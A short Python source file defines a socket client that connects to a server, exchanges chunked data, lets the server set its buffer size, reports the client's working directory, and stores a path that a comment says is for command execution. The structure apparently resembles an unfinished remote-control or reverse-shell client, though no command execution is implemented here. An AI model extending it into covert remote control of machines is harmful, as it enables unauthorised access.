import socket
import subprocess
import os
import sys
import time

class RemoteClient(object):

    def __init__(self,Ip,PortId,CharSet="utf-16",Buffering=1024):
       self.Ip=Ip                   #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId           #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)     #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet         #Character Set For Encoding And Decoding
       self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)

    def Connect(self):
        #Connect To The Server:
        self.client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        self.client_socket.connect(self.Address)

    def send(self,data):
        #Send data as chunks 
        for i in range(0,len(data),self.Buffering):
            chunk =data[i:i+self.Buffering]
            if chunk=="EOF":
                self.client_socket.send(chunk.lower().encode(self.CharSet))
            else:
                self.client_socket.send(chunk.encode(self.CharSet))
        
        #Delay for sending data end
        time.sleep(1)
        self.client_socket.send("EOF".encode(self.CharSet))
        return None

    def recv(self):
        #recieve data as chunks
        data=""
        while True:
            chunk=self.client_socket.recv(self.Buffering).decode(self.CharSet)
            if chunk=="EOF":            #check for the <EndOfFile> to determine data end
                break
            else:
                data+=chunk
        return data

    def GetBuffer(self):
        #Recieve the Buffer From Server Side
        return self.recv() 

    def SetBuffer(self):
        #Change The Value Of Buffering
        self.Buffering=int(self.GetBuffer())

    def LocationOfFile(self):
        #Send The  Location of the <client>  File Downloaded Path
        self.send(os.getcwd())
        return None

    def SysInfo(self):
        #Retrieve the System information of the client
        pass

    def PathConfig(self):
        #Configure the path for command execution
        self.path=self.recv()

if __name__=="__main__":
    r=RemoteClient("127.0.0.1",6787)
    r.Connect()
    r.SetBuffer()
    r.LocationOfFile()